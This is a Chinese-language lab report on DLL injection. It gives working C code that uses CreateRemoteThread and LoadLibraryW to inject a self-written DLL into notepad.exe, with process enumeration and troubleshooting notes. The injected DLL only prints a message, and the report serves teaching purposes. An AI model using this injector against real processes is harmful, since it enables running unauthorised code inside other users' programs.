# DLL 注入攻击

## `demoCreateRemoteThreadW`分析

- 跨进程创建线程，该线程使用`LoadLibraryW`加载 DLL
```c
DWORD demoCreateRemoteThreadW(PCWSTR pszLibFile, DWORD dwProcessId)
{
	// Calculate the number of bytes needed for the DLL's pathname
	DWORD dwSize = (lstrlenW(pszLibFile) + 1) * sizeof(wchar_t);

	// Get process handle passing in the process ID
	HANDLE hProcess = OpenProcess(
		PROCESS_QUERY_INFORMATION |
		PROCESS_CREATE_THREAD |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE,
		FALSE, dwProcessId);
	if (hProcess == NULL)
	{
		printf(TEXT("[-] Error: Could not open process for PID (%d).\n"), dwProcessId);
		return(1);
	}

	// Allocate space in the remote process for the pathname
	LPVOID pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	if (pszLibFileRemote == NULL)
	{
		printf(TEXT("[-] Error: Could not allocate memory inside PID (%d).\n"), dwProcessId);
		return(1);
	}

	// Copy the DLL's pathname to the remote process address space
	// WriteProcessMemory: Writes data to an area of memory in a specified process. The entire area to be written to must be accessible or the operation fails.
	DWORD n = WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID)pszLibFile, dwSize, NULL);
	if (n == 0)
	{
		printf(TEXT("[-] Error: Could not write any bytes into the PID [%d] address space.\n"), dwProcessId);
		return(1);
	}

	// Get the real address of LoadLibraryW in Kernel32.dll
	PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	if (pfnThreadRtn == NULL)
	{
		printf(TEXT("[-] Error: Could not find LoadLibraryA function inside kernel32.dll library.\n"));
		return(1);
	}

	// Create a remote thread that calls LoadLibraryW(DLLPathname)
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, pszLibFileRemote, 0, NULL);
	if (hThread == NULL)
	{
		printf(TEXT("[-] Error: Could not create the Remote Thread.\n"));
		return(1);
	}
	else
		printf(TEXT("[+] Success: DLL injected via CreateRemoteThread().\n"));

	// Wait for the remote thread to terminate
	WaitForSingleObject(hThread, INFINITE);

	// Free the remote memory that contained the DLL's pathname and close Handles
	if (pszLibFileRemote != NULL)
		VirtualFreeEx(hProcess, pszLibFileRemote, 0, MEM_RELEASE);

	if (hThread != NULL)
		CloseHandle(hThread);

	if (hProcess != NULL)
		CloseHandle(hProcess);

	return(0);
}
```

## 实验要求

- [x] 向一个目标程序注入一个我们自行编写的`dll`
- [x] 整合进程遍历的程序，使得攻击程序可以自己遍历进程得到目标程序的`pid`

## 实验过程

### 修改`base.c`

- 添加`DLL`入口点函数
	```c
	BOOL WINAPI DllMain(
		HINSTANCE hinstDLL,  // handle to DLL module
		DWORD fdwReason,     // reason for calling function
		LPVOID lpReserved)  // reserved
	{
		// Perform actions based on the reason for calling.
		switch (fdwReason)
		{
		case DLL_PROCESS_ATTACH:
			// Initialize once for each new process.
			lib_function("loaded");	// 进程初次加载baselib.dll时将调用lib_function
			// Return FALSE to fail DLL load.
			break;
		}
		return TRUE;  // Successful DLL_PROCESS_ATTACH.
	}
	```

### 攻击程序完整代码

- [`demoCreateRemoteThreadW`函数](#democreateremotethreadw分析)
- `getProcessID`函数
	```c
	DWORD getProcessID(const char* pname)
	{
		HANDLE hProcessSnap;
		PROCESSENTRY32 pe32;

		// Take a snapshot of all processes in the system.
		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hProcessSnap == INVALID_HANDLE_VALUE)
		{
			printf(TEXT("CreateToolhelp32Snapshot (of processes)"));
			return(FALSE);
		}

		// Set the size of the structure before using it.
		pe32.dwSize = sizeof(PROCESSENTRY32);

		// Retrieve information about the first process,
		// and exit if unsuccessful
		if (!Process32First(hProcessSnap, &pe32))
		{
			printf(TEXT("Process32First")); // show cause of failure
			CloseHandle(hProcessSnap);          // clean the snapshot object
			return(FALSE);
		}

		// Now walk the snapshot of processes, and
		// get pid with the given process name
		do
		{
			if (lstrcmp(pe32.szExeFile, TEXT(pname)) == 0)
			{
				CloseHandle(hProcessSnap);
				return pe32.th32ProcessID;
			}
		} while (Process32Next(hProcessSnap, &pe32));
		return FALSE;
	}
	```
- `main`函数
	```c
	int main()
	{
		// 由notepad.exe来加载dll，应使用绝对路径
		PCWSTR dllpath = L"F:/XXX/Happy/Debug/baselib.dll";
		DWORD pid = getProcessID("notepad.exe");
		if (pid == 0) exit(0);
		return demoCreateRemoteThreadW(dllpath, pid);
	}
	```

### 实验效果

![DLL 成功注入](img/dll-injection-success.png)

## 问题及解决

### 无法获得进程句柄

- 应使用管理员身份运行攻击者程序

### 无法创建远程线程

- 由远程进程创建加载 DLL 的线程，远程进程的程序所在目录与当前进程的程序所在目录通常不同，因而提供的 DLL 路径应为绝对路径
- 不使用`C:\Windows\System32`下，64位的`notepad.exe`，改为使用`C:\Windows\SysWOW64`下，32位的`notepad.exe`

## 实验总结

- 结合标准库`CreateRemoteThread`函数和 DLL 加载时可以强制调用函数的特性进行 DLL 注入攻击

## 参考资料

- [Dynamic-Link Library Entry-Point Function](https://docs.microsoft.com/zh-cn/windows/win32/dlls/dynamic-link-library-entry-point-function)